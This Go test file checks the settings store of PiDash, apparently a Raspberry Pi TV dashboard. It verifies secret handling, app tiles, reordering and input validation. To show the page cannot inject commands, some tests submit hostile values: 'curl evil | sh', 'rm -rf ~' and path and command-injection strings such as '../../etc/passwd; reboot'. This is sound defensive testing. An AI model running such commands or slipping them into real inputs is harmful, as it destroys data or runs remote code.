package settings

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/DarioRomano/PiDash/internal/config"
	"github.com/DarioRomano/PiDash/internal/desktop"
)

// base imitates a config.toml with the shipped YouTube and Netflix apps, one
// hand-written program, and port 8080.
func base() config.Config {
	cfg := config.Default()
	cfg.Apps = []config.App{
		{ID: "youtube", Name: "YouTube", URL: "https://www.youtube.com/tv", Browser: "firefox", AdBlock: true, UserAgent: youTubeTV},
		{ID: "netflix", Name: "Netflix", URL: "https://www.netflix.com/browse"},
		{ID: "retro", Name: "RetroArch", Command: "retroarch --fullscreen"},
	}
	if err := cfg.Finish(); err != nil {
		panic(err)
	}
	return cfg
}

func open(t *testing.T) (*Store, string) {
	t.Helper()
	path := filepath.Join(t.TempDir(), "pidash", "settings.json")
	s, err := Open(path, base())
	if err != nil {
		t.Fatal(err)
	}
	// What is installed on the machine running the tests must not matter.
	s.installed = func() []desktop.Entry { return nil }
	return s, path
}

func TestWithoutSettingsFileTheConfigFileRules(t *testing.T) {
	s, _ := open(t)
	cfg, err := s.Effective()
	if err != nil || len(cfg.Apps) != 3 || cfg.Weather.Enabled() || cfg.Server.Listen != ":8080" {
		t.Fatalf("cfg = %+v, err %v", cfg.Apps, err)
	}
	v := s.View()
	kinds := []string{}
	for _, a := range v.Apps {
		kinds = append(kinds, a.Kind+":"+a.ID)
	}
	if got, want := strings.Join(kinds, " "), "preset:youtube preset:netflix file:retro"; got != want {
		t.Errorf("apps on the page = %s, want %s", got, want)
	}
	if v.Apps[2].Detail != "retroarch --fullscreen" || len(v.Presets) < 5 {
		t.Errorf("view = %+v", v.Apps[2])
	}
}

func TestSavingWeatherAndSynology(t *testing.T) {
	s, path := open(t)
	err := s.Save(Update{
		Weather: &Weather{Location: " Zurich ", Units: "metric"},
		Photos: &Photos{Source: "synology", IntervalSeconds: 45,
			Synology: Synology{URL: "http://nas.local:5000/", Username: "pidash", Password: "s3cret", Quality: "preview"}},
	})
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := s.Effective()
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Weather.Location != "Zurich" || !cfg.Weather.Enabled() {
		t.Errorf("weather = %+v", cfg.Weather)
	}
	p := cfg.Photos
	if p.Source != "synology" || p.Interval.Duration.Seconds() != 45 || p.Synology.URL != "http://nas.local:5000" || p.Synology.Password != "s3cret" || p.Synology.Quality != "preview" {
		t.Errorf("photos = %+v", p)
	}

	// The page is never given the password back, and the file is private.
	if b, _ := json.Marshal(s.View()); strings.Contains(string(b), "s3cret") {
		t.Error("the settings view contains the NAS password")
	}
	if !s.View().Photos.Synology.PasswordSet {
		t.Error("the view should say that a password is stored")
	}
	if fi, err := os.Stat(path); err != nil || fi.Mode().Perm() != 0o600 {
		t.Errorf("settings.json mode = %v, err %v; want 0600", fi.Mode().Perm(), err)
	}

	// Saving again with an empty password keeps the stored one.
	err = s.Save(Update{Photos: &Photos{Source: "synology", IntervalSeconds: 60,
		Synology: Synology{URL: "http://nas.local:5000", Username: "pidash", Quality: "original"}}})
	if err != nil {
		t.Fatal(err)
	}
	if cfg, _ := s.Effective(); cfg.Photos.Synology.Password != "s3cret" || cfg.Photos.Interval.Duration.Seconds() != 60 {
		t.Errorf("password was lost or interval not updated: %+v", cfg.Photos)
	}

	// It all survives a restart.
	s2, err := Open(path, base())
	if err != nil {
		t.Fatal(err)
	}
	if cfg, _ := s2.Effective(); cfg.Weather.Location != "Zurich" || cfg.Photos.Synology.Username != "pidash" {
		t.Errorf("after reopening: %+v", cfg.Weather)
	}
}

func TestInvalidSettingsAreRefusedAndNothingIsWritten(t *testing.T) {
	s, path := open(t)
	cases := map[string]Update{
		"synology without login": {Photos: &Photos{Source: "synology", Synology: Synology{URL: "http://nas:5000", Quality: "original"}}},
		"bad NAS address":        {Photos: &Photos{Source: "synology", Synology: Synology{URL: "nas", Username: "a", Password: "b", Quality: "original"}}},
		"bad units":              {Weather: &Weather{Location: "Zurich", Units: "kelvin"}},
		"website without name":   {Apps: &[]App{{Kind: KindWeb, URL: "https://example.com"}}},
		"website bad address":    {Apps: &[]App{{Kind: KindWeb, Name: "X", URL: "example.com"}}},
		"unknown preset":         {Apps: &[]App{{Kind: KindPreset, Preset: "doom"}}},
		"preset missing address": {Apps: &[]App{{Kind: KindPreset, Preset: "synology-photos"}}},
		"unknown kind":           {Apps: &[]App{{Kind: "command", Name: "x"}}},
	}
	for name, u := range cases {
		if err := s.Save(u); err == nil {
			t.Errorf("%s: expected an error", name)
		}
	}
	if _, err := os.Stat(path); err == nil {
		t.Error("a refused update must not create settings.json")
	}
}

func TestAppsFromTheSettingsPage(t *testing.T) {
	s, _ := open(t)
	err := s.Save(Update{Apps: &[]App{
		{Kind: KindPreset, Preset: "netflix"},
		{Kind: KindPreset, Preset: "synology-photos", Name: "Photos", URL: "http://nas.local:5000/?launchApp=SYNO.Foto.AppInstance"},
		{Kind: KindPreset, Preset: "moonlight"},
		{Kind: KindWeb, Name: "ARD Mediathek!", URL: "https://www.ardmediathek.de/", AdBlock: true},
		{Kind: KindWeb, Name: "ARD Mediathek", URL: "https://example.org/"},
		{Kind: KindFile, ID: "retro"},
	}})
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := s.Effective()
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, a := range cfg.Apps {
		got = append(got, a.ID)
	}
	want := "netflix synology-photos moonlight ard-mediathek ard-mediathek-2 retro"
	if strings.Join(got, " ") != want {
		t.Fatalf("apps = %v, want %s", got, want)
	}
	if a := cfg.Apps[1]; a.Name != "Photos" || !strings.Contains(a.URL, "SYNO.Foto") {
		t.Errorf("synology photos = %+v", a)
	}
	if a := cfg.Apps[2]; a.Command != "moonlight-qt" || a.Mode != config.AppModeConsole {
		t.Errorf("moonlight = %+v", a)
	}
	if a := cfg.Apps[3]; a.Browser != config.BrowserFirefox || !a.AdBlock {
		t.Errorf("the ad blocker should switch the site to Firefox: %+v", a)
	}
	// A program from config.toml keeps its exact command; YouTube was removed.
	if a := cfg.Apps[5]; a.Command != "retroarch --fullscreen" {
		t.Errorf("retro = %+v", a)
	}
}

func TestTheSettingsPageCannotDefineCommands(t *testing.T) {
	s, _ := open(t)
	// Whatever is sent, a command only ever comes from a preset or config.toml.
	raw := `{"apps":[{"kind":"web","name":"Evil","url":"https://example.com","command":"rm -rf ~"},
	                 {"kind":"file","id":"nonexistent","command":"curl evil | sh"}]}`
	var u Update
	if err := json.Unmarshal([]byte(raw), &u); err != nil {
		t.Fatal(err)
	}
	if err := s.Save(u); err == nil {
		t.Fatal("a reference to a program that is not in config.toml must be refused")
	}
	u.Apps = &[]App{(*u.Apps)[0]}
	if err := s.Save(u); err != nil {
		t.Fatal(err)
	}
	cfg, _ := s.Effective()
	if cfg.Apps[0].Command != "" || cfg.Apps[0].URL != "https://example.com" {
		t.Errorf("a command slipped through: %+v", cfg.Apps[0])
	}
}

func TestPortIsRememberedOnlyWhileTheConfigFileStillAsksForTheTakenOne(t *testing.T) {
	s, path := open(t)
	if err := s.RememberPort(":8080", ":8081"); err != nil {
		t.Fatal(err)
	}
	if cfg, _ := s.Effective(); cfg.Server.Listen != ":8081" {
		t.Errorf("listen = %s, want the remembered :8081", cfg.Server.Listen)
	}
	// The person now picks a port in config.toml: that wins.
	changed := base()
	changed.Server.Listen = ":9000"
	s2, _ := Open(path, changed)
	if cfg, _ := s2.Effective(); cfg.Server.Listen != ":9000" {
		t.Errorf("listen = %s, want :9000 from config.toml", cfg.Server.Listen)
	}
}

func TestDamagedSettingsFileIsIgnored(t *testing.T) {
	path := filepath.Join(t.TempDir(), "settings.json")
	os.WriteFile(path, []byte("{ not json"), 0o600)
	s, err := Open(path, base())
	if err == nil || !strings.Contains(err.Error(), "damaged") {
		t.Errorf("err = %v", err)
	}
	if cfg, err := s.Effective(); err != nil || len(cfg.Apps) != 3 {
		t.Errorf("PiDash should run on config.toml alone: %v", err)
	}
}

func TestAddingAnInstalledProgram(t *testing.T) {
	s, path := open(t)
	installed := []desktop.Entry{
		{ID: "org.videolan.VLC", Name: "VLC media player", Exec: "/usr/bin/vlc --started-from-file %U", Icon: "vlc"},
		{ID: "steam", Name: "Steam", Exec: "steam %U", Icon: "/opt/steam/icon.png"},
	}
	s.installed = func() []desktop.Entry { return installed }

	if v := s.View(); len(v.Installed) != 2 || v.Installed[0].Name != "VLC media player" {
		t.Fatalf("installed on the page = %+v", v.Installed)
	}
	err := s.Save(Update{Apps: &[]App{
		{Kind: KindPreset, Preset: "netflix"},
		{Kind: KindDesktop, Desktop: "org.videolan.VLC"},
		{Kind: KindDesktop, Desktop: "steam", Name: "Games"},
	}})
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := s.Effective()
	if err != nil || len(cfg.Apps) != 3 {
		t.Fatalf("apps = %+v, err %v", cfg.Apps, err)
	}
	vlc, steam := cfg.Apps[1], cfg.Apps[2]
	if vlc.ID != "org-videolan-vlc" || vlc.Name != "VLC media player" || vlc.Command != "/usr/bin/vlc --started-from-file" || vlc.Icon != "vlc" || vlc.Mode != config.AppModeDesktop {
		t.Errorf("vlc = %+v", vlc)
	}
	if steam.Name != "Games" || steam.Command != "steam" {
		t.Errorf("steam = %+v", steam)
	}

	// The page can only name a program. A command it sends along is not stored
	// and not run: the command always comes from the Pi's own menu entry.
	raw := `{"apps":[{"kind":"desktop","desktop":"steam","command":"rm -rf ~","exec":"rm -rf ~"}]}`
	var u Update
	if err := json.Unmarshal([]byte(raw), &u); err != nil {
		t.Fatal(err)
	}
	if err := s.Save(u); err != nil {
		t.Fatal(err)
	}
	if cfg, _ := s.Effective(); len(cfg.Apps) != 1 || cfg.Apps[0].Command != "steam" {
		t.Errorf("apps = %+v", cfg.Apps)
	}
	if data, _ := os.ReadFile(path); strings.Contains(string(data), "rm -rf") {
		t.Errorf("a command from the page was stored: %s", data)
	}
}

func TestAnUninstalledProgramOnlyLosesItsTile(t *testing.T) {
	s, _ := open(t)
	installed := []desktop.Entry{{ID: "steam", Name: "Steam", Exec: "steam %U"}}
	s.installed = func() []desktop.Entry { return installed }
	err := s.Save(Update{
		Weather: &Weather{Location: "Zurich", Units: "metric"},
		Apps:    &[]App{{Kind: KindDesktop, Desktop: "steam"}, {Kind: KindPreset, Preset: "netflix"}},
	})
	if err != nil {
		t.Fatal(err)
	}

	installed = nil // Steam was removed from the Pi
	cfg, err := s.Effective()
	if err != nil || len(cfg.Apps) != 1 || cfg.Apps[0].ID != "netflix" || cfg.Weather.Location != "Zurich" {
		t.Fatalf("apps = %+v, weather %q, err %v; want Netflix alone and the weather kept", cfg.Apps, cfg.Weather.Location, err)
	}
	v := s.View()
	if len(v.Apps) != 2 || !v.Apps[0].Missing || v.Apps[1].Missing {
		t.Errorf("the page should still list Steam, marked as missing: %+v", v.Apps)
	}
	// Saving the list as the page shows it keeps working.
	if err := s.Save(Update{Apps: &v.Apps}); err != nil {
		t.Errorf("saving with a missing program: %v", err)
	}

	installed = []desktop.Entry{{ID: "steam", Name: "Steam", Exec: "steam %U"}}
	if cfg, _ := s.Effective(); len(cfg.Apps) != 2 {
		t.Errorf("Steam should be back after reinstalling: %+v", cfg.Apps)
	}

	// An unknown name is refused nowhere near a shell: it is simply not installed.
	if err := s.Save(Update{Apps: &[]App{{Kind: KindDesktop, Desktop: "../../etc/passwd; reboot"}}}); err != nil {
		t.Errorf("err = %v", err)
	}
	if cfg, _ := s.Effective(); len(cfg.Apps) != 0 {
		t.Errorf("apps = %+v", cfg.Apps)
	}
}

func TestPhotoMovementAndPairsFromTheSettingsPage(t *testing.T) {
	s, _ := open(t)
	yes := true
	err := s.Save(Update{Photos: &Photos{Source: "", IntervalSeconds: 30, Motion: "whole", PairPortraits: &yes}})
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := s.Effective()
	if err != nil || cfg.Photos.Motion != "whole" || !cfg.Photos.PairPortraits {
		t.Errorf("motion %q, pairs %v, err %v", cfg.Photos.Motion, cfg.Photos.PairPortraits, err)
	}
	if v := s.View(); v.Photos.Motion != "whole" || !v.Photos.PairPortraits {
		t.Errorf("page shows motion %q, pairs %v", v.Photos.Motion, v.Photos.PairPortraits)
	}
	if err := s.Save(Update{Photos: &Photos{Motion: "sideways"}}); err == nil {
		t.Error("an unknown kind of movement was accepted")
	}

	// A settings file written before these options existed leaves config.toml in charge of them.
	withFile := base()
	withFile.Photos.Motion, withFile.Photos.PairPortraits = "fill", true
	path := filepath.Join(t.TempDir(), "settings.json")
	os.WriteFile(path, []byte(`{"photos":{"source":"","intervalSeconds":45,"synology":{}}}`), 0o600)
	old, err := Open(path, withFile)
	if err != nil {
		t.Fatal(err)
	}
	if cfg, err := old.Effective(); err != nil || cfg.Photos.Motion != "fill" || !cfg.Photos.PairPortraits || cfg.Photos.Interval.Duration != 45*time.Second {
		t.Errorf("motion %q, pairs %v, interval %v, err %v", cfg.Photos.Motion, cfg.Photos.PairPortraits, cfg.Photos.Interval.Duration, err)
	}
}

func TestCalendarLinksAndTheHomeTokenStayOnThePi(t *testing.T) {
	s, path := open(t)
	secret := "https://calendar.example.com/private-8f3a2b/basic.ics"
	err := s.Save(Update{
		Calendar: &Calendar{Links: []Link{{URL: " " + secret + " "}}},
		Home:     &Home{URL: "http://ha.local:8123/", Token: "long-lived-token", Entities: []string{"light.sofa"}},
		System:   &System{AutoUpdate: true},
	})
	if err != nil {
		t.Fatal(err)
	}
	cfg, _ := s.Effective()
	if len(cfg.Calendar.URLs) != 1 || cfg.Calendar.URLs[0] != secret || cfg.Home.URL != "http://ha.local:8123" || cfg.Home.Token != "long-lived-token" || !cfg.Update.Auto {
		t.Fatalf("calendar %v, home %+v, update %+v", cfg.Calendar.URLs, cfg.Home, cfg.Update)
	}

	// The page is told where the link leads and that a token exists, not what they are.
	v := s.View()
	page, _ := json.Marshal(v)
	if strings.Contains(string(page), "private-8f3a2b") || strings.Contains(string(page), "long-lived-token") {
		t.Errorf("a secret reached the page: %s", page)
	}
	if len(v.Calendar.Links) != 1 || v.Calendar.Links[0].Host != "calendar.example.com" || v.Calendar.Links[0].Key == "" || !v.Home.TokenSet {
		t.Fatalf("view = %+v, %+v", v.Calendar, v.Home)
	}

	// Saving again with what the page has keeps both; a second link is added.
	err = s.Save(Update{
		Calendar: &Calendar{Links: []Link{{Key: v.Calendar.Links[0].Key}, {URL: "webcal://other.example.org/cal.ics"}, {Key: "unknown"}}},
		Home:     &Home{URL: "http://ha.local:8123", Entities: []string{"light.sofa", "scene.movie"}},
	})
	if err != nil {
		t.Fatal(err)
	}
	cfg, _ = s.Effective()
	if got := strings.Join(cfg.Calendar.URLs, " "); got != secret+" webcal://other.example.org/cal.ics" {
		t.Errorf("calendars = %s", got)
	}
	if cfg.Home.Token != "long-lived-token" || len(cfg.Home.Entities) != 2 {
		t.Errorf("home = %+v", cfg.Home)
	}

	// Mistakes are refused; clearing the address forgets the token.
	if err := s.Save(Update{Calendar: &Calendar{Links: []Link{{URL: "ftp://example.org/x.ics"}}}}); err == nil {
		t.Error("an ftp link was accepted")
	}
	if err := s.Save(Update{Home: &Home{URL: "http://ha.local:8123", Entities: []string{"Light.Sofa; rm"}}}); err == nil {
		t.Error("a malformed entity id was accepted")
	}
	if err := s.Save(Update{Home: &Home{URL: ""}}); err != nil {
		t.Fatal(err)
	}
	if cfg, _ = s.Effective(); cfg.Home.Enabled() || cfg.Home.Token != "" {
		t.Errorf("home after clearing = %+v", cfg.Home)
	}
	if fi, _ := os.Stat(path); fi.Mode().Perm() != 0o600 {
		t.Errorf("settings.json is readable by others: %v", fi.Mode().Perm())
	}
}

func TestLockRadioAndScreenSettings(t *testing.T) {
	s, _ := open(t)
	stations := []config.RadioStation{{Name: " Jazz ", URL: "https://stream.example/jazz.mp3"}}
	err := s.Save(Update{
		Lock:   &Lock{PIN: "4711"},
		Radio:  &stations,
		Screen: &Screen{Language: "de", ClockPosition: "top-right", ClockSize: "small", View: "details"},
	})
	if err != nil {
		t.Fatal(err)
	}
	cfg, _ := s.Effective()
	d := cfg.Display
	if cfg.Remote.PIN != "4711" || len(cfg.Radio) != 1 || cfg.Radio[0].Name != "Jazz" || d.Language != "de" || d.ClockPosition != "top-right" || d.ClockSize != "small" || d.View != "details" {
		t.Fatalf("pin %q, radio %+v, display %+v", cfg.Remote.PIN, cfg.Radio, d)
	}
	// The page learns that a PIN exists, never which.
	v := s.View()
	if page, _ := json.Marshal(v); strings.Contains(string(page), "4711") || !v.Lock.Set {
		t.Errorf("lock on the page: %+v, page %s", v.Lock, page)
	}
	// Sending nothing keeps the PIN; "remove" deletes it.
	if err := s.Save(Update{Lock: &Lock{}}); err != nil {
		t.Fatal(err)
	}
	if cfg, _ = s.Effective(); cfg.Remote.PIN != "4711" {
		t.Errorf("the PIN was lost: %q", cfg.Remote.PIN)
	}
	if err := s.Save(Update{Lock: &Lock{Remove: true}}); err != nil {
		t.Fatal(err)
	}
	if cfg, _ = s.Effective(); cfg.Remote.PIN != "" || s.View().Lock.Set {
		t.Errorf("the PIN was not removed: %q", cfg.Remote.PIN)
	}

	for name, bad := range map[string]Update{
		"a short PIN":                {Lock: &Lock{PIN: "12"}},
		"a PIN with letters":         {Lock: &Lock{PIN: "12ab"}},
		"a station without a stream": {Radio: &[]config.RadioStation{{Name: "x", URL: "ftp://x"}}},
		"an unknown language":        {Screen: &Screen{Language: "xx"}},
		"an unknown corner":          {Screen: &Screen{ClockPosition: "middle"}},
	} {
		if err := s.Save(bad); err == nil {
			t.Errorf("%s was accepted", name)
		}
	}

	// A backup carries everything, and loading it puts it back.
	saved := s.Export()
	other, _ := open(t)
	if err := other.Import(saved); err != nil {
		t.Fatal(err)
	}
	if cfg, _ := other.Effective(); len(cfg.Radio) != 1 || cfg.Display.Language != "de" {
		t.Errorf("after loading the backup: %+v, language %q", cfg.Radio, cfg.Display.Language)
	}
	broken := saved
	broken.Screen = &Screen{Language: "xx"}
	if err := other.Import(broken); err == nil {
		t.Error("a backup with a mistake in it was loaded")
	}
}

func appIDs(t *testing.T, s *Store) string {
	t.Helper()
	cfg, err := s.Effective()
	if err != nil {
		t.Fatal(err)
	}
	ids := []string{}
	for _, a := range cfg.Apps {
		ids = append(ids, a.ID)
	}
	return strings.Join(ids, " ")
}

func TestReorderingAppsFromTheTV(t *testing.T) {
	// Straight from config.toml, before anything was ever saved.
	s, path := open(t)
	before, _ := s.Effective()
	if err := s.ReorderApps([]string{"retro", "youtube", "netflix"}); err != nil {
		t.Fatal(err)
	}
	if got := appIDs(t, s); got != "retro youtube netflix" {
		t.Errorf("order = %s", got)
	}
	// Nothing but the order changed: the hand-written command is still the
	// one from config.toml, and YouTube kept its ad blocker.
	after, _ := s.Effective()
	if after.Apps[0].Command != "retroarch --fullscreen" || !after.Apps[1].AdBlock || after.Apps[1].UserAgent != before.Apps[0].UserAgent {
		t.Errorf("apps changed by reordering: %+v", after.Apps)
	}
	if data, _ := os.ReadFile(path); strings.Contains(string(data), "retroarch --fullscreen") {
		t.Errorf("a command ended up in settings.json: %s", data)
	}
	// It survives a restart.
	again, err := Open(path, base())
	if err != nil {
		t.Fatal(err)
	}
	again.installed = func() []desktop.Entry { return nil }
	if got := appIDs(t, again); got != "retro youtube netflix" {
		t.Errorf("order after a restart = %s", got)
	}

	// Orders that do not name exactly these apps change nothing.
	for _, bad := range [][]string{{"retro", "youtube"}, {"retro", "youtube", "plex"}, {"retro", "retro", "netflix"}, nil} {
		if err := s.ReorderApps(bad); err == nil {
			t.Errorf("order %v was accepted", bad)
		}
	}
	if got := appIDs(t, s); got != "retro youtube netflix" {
		t.Errorf("a refused order changed the row: %s", got)
	}
}

func TestReorderingKeepsProgramsThatAreNotInstalledRightNow(t *testing.T) {
	s, _ := open(t)
	installed := []desktop.Entry{{ID: "steam", Name: "Steam", Exec: "steam %U"}}
	s.installed = func() []desktop.Entry { return installed }
	if err := s.Save(Update{Apps: &[]App{{Kind: KindDesktop, Desktop: "steam"}, {Kind: KindPreset, Preset: "netflix"}, {Kind: KindPreset, Preset: "youtube"}}}); err != nil {
		t.Fatal(err)
	}
	installed = nil // Steam is gone for now: the row shows Netflix and YouTube
	if err := s.ReorderApps([]string{"youtube", "netflix"}); err != nil {
		t.Fatal(err)
	}
	installed = []desktop.Entry{{ID: "steam", Name: "Steam", Exec: "steam %U"}}
	if got := appIDs(t, s); got != "youtube netflix steam" {
		t.Errorf("order with Steam back = %s, want youtube netflix steam", got)
	}
}

func TestAppsOfTheSameNameCannotChangePlaces(t *testing.T) {
	s, _ := open(t)
	if err := s.Save(Update{Apps: &[]App{
		{Kind: KindWeb, Name: "News", URL: "https://one.example"},
		{Kind: KindWeb, Name: "News", URL: "https://two.example"},
		{Kind: KindPreset, Preset: "netflix"},
	}}); err != nil {
		t.Fatal(err)
	}
	if got := appIDs(t, s); got != "news news-2 netflix" {
		t.Fatalf("ids = %s", got)
	}
	// Each keeps its browser profile, which is named after the id.
	if err := s.ReorderApps([]string{"news-2", "news", "netflix"}); err == nil {
		t.Error("swapping two apps of the same name would swap their ids; it must be refused")
	}
	if err := s.ReorderApps([]string{"netflix", "news", "news-2"}); err != nil {
		t.Errorf("moving another app around them: %v", err)
	}
	cfg, _ := s.Effective()
	if cfg.Apps[1].URL != "https://one.example" || cfg.Apps[2].URL != "https://two.example" {
		t.Errorf("apps = %+v", cfg.Apps)
	}
}

func TestCoolingSwitch(t *testing.T) {
	s, _ := open(t)
	if v := s.View(); v.System.Cooling == nil || !*v.System.Cooling {
		t.Fatalf("cooling is on unless switched off: %+v", v.System)
	}
	off, on := false, true
	if err := s.Save(Update{System: &System{Cooling: &off}}); err != nil {
		t.Fatal(err)
	}
	if cfg, _ := s.Effective(); cfg.System.CoolAbove != 0 {
		t.Errorf("cool_above = %v after switching it off", cfg.System.CoolAbove)
	}
	if err := s.Save(Update{System: &System{Cooling: &on}}); err != nil {
		t.Fatal(err)
	}
	if cfg, _ := s.Effective(); cfg.System.CoolAbove != 75 {
		t.Errorf("cool_above = %v after switching it on", cfg.System.CoolAbove)
	}
	// Settings saved by a version without the switch leave it as it is.
	if err := s.Save(Update{System: &System{AutoUpdate: true}}); err != nil {
		t.Fatal(err)
	}
	if cfg, _ := s.Effective(); cfg.System.CoolAbove != 75 || !cfg.Update.Auto {
		t.Errorf("cool_above = %v, auto = %v", cfg.System.CoolAbove, cfg.Update.Auto)
	}
}

func TestEmulatorsAreOfferedAndStartFullscreen(t *testing.T) {
	s, path := open(t)
	installed := []desktop.Entry{
		{ID: "retroarch", Name: "RetroArch", Exec: "retroarch", Icon: "retroarch", Window: "retroarch"},
		// A Flatpak: its menu entry runs it through flatpak.
		{ID: "org.ppsspp.PPSSPP", Name: "PPSSPP", Exec: "/usr/bin/flatpak run --command=PPSSPPSDL org.ppsspp.PPSSPP @@ %f @@", Window: "org.ppsspp.PPSSPP"},
		{ID: "dosbox", Name: "DOSBox Emulator", Exec: "dosbox -fullscreen"},
		{ID: "org.videolan.VLC", Name: "VLC media player", Exec: "vlc %U"},
	}
	s.installed = func() []desktop.Entry { return installed }

	found := map[string]string{}
	for _, em := range s.View().Emulators {
		found[em.ID] = em.Desktop
		if em.Name == "" || em.Systems == "" || em.Description == "" || em.Install == "" {
			t.Errorf("%s lacks a text for the page: %+v", em.ID, em)
		}
	}
	if len(found) != len(Emulators) || found["retroarch"] != "retroarch" || found["ppsspp"] != "org.ppsspp.PPSSPP" || found["dosbox"] != "dosbox" || found["mame"] != "" || found["scummvm"] != "" {
		t.Errorf("emulators found installed = %v", found)
	}

	// The page adds one like any installed program: by the name of its menu entry.
	err := s.Save(Update{Apps: &[]App{
		{Kind: KindDesktop, Desktop: "retroarch"},
		{Kind: KindDesktop, Desktop: "org.ppsspp.PPSSPP"},
		{Kind: KindDesktop, Desktop: "dosbox", Name: "Old games"},
		{Kind: KindDesktop, Desktop: "org.videolan.VLC"},
	}})
	if err != nil {
		t.Fatal(err)
	}
	cfg, err := s.Effective()
	if err != nil || len(cfg.Apps) != 4 {
		t.Fatalf("apps = %+v, err %v", cfg.Apps, err)
	}
	retro, psp, dos, vlc := cfg.Apps[0], cfg.Apps[1], cfg.Apps[2], cfg.Apps[3]
	if retro.Command != "retroarch -f" || retro.Window != "retroarch" || retro.Name != "RetroArch" {
		t.Errorf("RetroArch = %+v", retro)
	}
	if psp.Command != "/usr/bin/flatpak run --command=PPSSPPSDL org.ppsspp.PPSSPP @@ @@ --fullscreen" {
		t.Errorf("PPSSPP command = %q", psp.Command)
	}
	// Already fullscreen in its menu entry: not said twice. A name typed on the page wins.
	if dos.Command != "dosbox -fullscreen" || dos.Name != "Old games" {
		t.Errorf("DOSBox = %+v", dos)
	}
	if vlc.Command != "vlc" {
		t.Errorf("other programs must start exactly as from the menu: %q", vlc.Command)
	}
	if data, _ := os.ReadFile(path); strings.Contains(string(data), "fullscreen") || strings.Contains(string(data), "flatpak") {
		t.Errorf("commands belong to the Pi, not to settings.json: %s", data)
	}
}
